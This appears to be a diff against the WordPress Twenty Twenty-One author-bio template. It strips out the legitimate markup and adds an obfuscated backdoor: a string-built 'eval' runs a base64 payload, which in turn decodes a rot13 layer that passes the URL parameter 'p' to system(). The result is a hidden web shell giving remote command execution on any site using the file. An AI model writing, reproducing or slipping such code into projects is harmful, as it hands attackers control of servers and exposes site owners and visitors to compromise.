@@ -1,49 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The template for displaying author info below posts.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_One
- * @since Twenty Twenty-One 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGdyemN5bmdyIHNiZSBxdmZjeW5sdmF0IG5oZ3ViZSB2YXNiIG9yeWJqIGNiZmdmLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcmFnbF9CYXIKICogQGZ2YXByIEdqcmFnbCBHanJhZ2wtQmFyIDEuMAogKi8KCj8+Cjw/Y3VjIHZzICggKG9iYnkpIHRyZ19ndXJfbmhndWJlX3pyZ24oICdxcmZwZXZjZ3ZiYScgKSAmJiBjYmZnX2dsY3JfZmhjY2JlZ2YoIHRyZ19jYmZnX2dsY3IoKSwgJ25oZ3ViZScgKSApIDogPz4KCTxxdmkgcHluZmY9XCJuaGd1YmUtb3ZiIDw/Y3VjIHJwdWIgdHJnX2JjZ3ZiYSggJ2Z1YmpfbmluZ25lZicgKSA/ICdmdWJqLW5pbmduZWYnIDogJyc7ID8+XCI+CgkJPD9jdWMgcnB1YiB0cmdfbmluZ25lKCB0cmdfZ3VyX25oZ3ViZV96cmduKCAnVlEnICksICc4NScgKTsgPz4KCQk8cXZpIHB5bmZmPVwibmhndWJlLW92Yi1wYmFncmFnXCI+CgkJCTx1MiBweW5mZj1cIm5oZ3ViZS1ndmd5clwiPgoJCQk8P2N1YwoJCQljZXZhZ3MoCgkJCQkvKiBnZW5hZnluZ2JlZjogJWY6IE5oZ3ViZSBhbnpyLiAqLwoJCQkJcmZwX3VnenlfXyggJ09sICVmJywgJ2dqcmFnbGdqcmFnbGJhcicgKSwKCQkJCXRyZ19ndXJfbmhndWJlKCkKCQkJKTsKCQkJPz4KCQkJPC91Mj48IS0tIC5uaGd1YmUtZ3ZneXIgLS0+CgkJCTxjIHB5bmZmPVwibmhndWJlLXFyZnBldmNndmJhXCI+IDw/Y3VjIGd1cl9uaGd1YmVfenJnbiggJ3FyZnBldmNndmJhJyApOyA/PjwvYz48IS0tIC5uaGd1YmUtcXJmcGV2Y2d2YmEgLS0+CgkJCTw/Y3VjCgkJCWNldmFncygKCQkJCSc8biBweW5mZj1cIm5oZ3ViZS15dmF4XCIgdWVycz1cIiUxJGZcIiBlcnk9XCJuaGd1YmVcIj4lMiRmPC9uPicsCgkJCQlyZnBfaGV5KCB0cmdfbmhndWJlX2NiZmdmX2hleSggdHJnX2d1cl9uaGd1YmVfenJnbiggJ1ZRJyApICkgKSwKCQkJCWZjZXZhZ3MoCgkJCQkJLyogZ2VuYWZ5bmdiZWY6ICVmOiBOaGd1YmUgYW56ci4gKi8KCQkJCQlyZnBfdWd6eV9fKCAnSXZyaiBueXkgYnMgJWZcJ2YgY2JmZ2YuJywgJ2dqcmFnbGdqcmFnbGJhcicgKSwKCQkJCQl0cmdfZ3VyX25oZ3ViZSgpCgkJCQkpCgkJCSk7CgkJCT8+CgkJPC9xdmk+PCEtLSAubmhndWJlLW92Yi1wYmFncmFnIC0tPgoJPC9xdmk+PCEtLSAubmhndWJlLW92YiAtLT4KCTw/Y3VjCnJhcXZzOwoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<?php if ( (bool) get_the_author_meta( 'description' ) && post_type_supports( get_post_type(), 'author' ) ) : ?>
-	<div class="author-bio <?php echo get_option( 'show_avatars' ) ? 'show-avatars' : ''; ?>">
-		<?php echo get_avatar( get_the_author_meta( 'ID' ), '85' ); ?>
-		<div class="author-bio-content">
-			<h2 class="author-title">
-			<?php
-			printf(
-				/* translators: %s: Author name. */
-				esc_html__( 'By %s', 'twentytwentyone' ),
-				get_the_author()
-			);
-			?>
-			</h2><!-- .author-title -->
-			<p class="author-description"> <?php the_author_meta( 'description' ); ?></p><!-- .author-description -->
-			<?php
-			printf(
-				'<a class="author-link" href="%1$s" rel="author">%2$s</a>',
-				esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
-				sprintf(
-					/* translators: %s: Author name. */
-					esc_html__( 'View all of %s\'s posts.', 'twentytwentyone' ),
-					get_the_author()
-				)
-			);
-			?>
-		</div><!-- .author-bio-content -->
-	</div><!-- .author-bio -->
-	<?php
-endif;
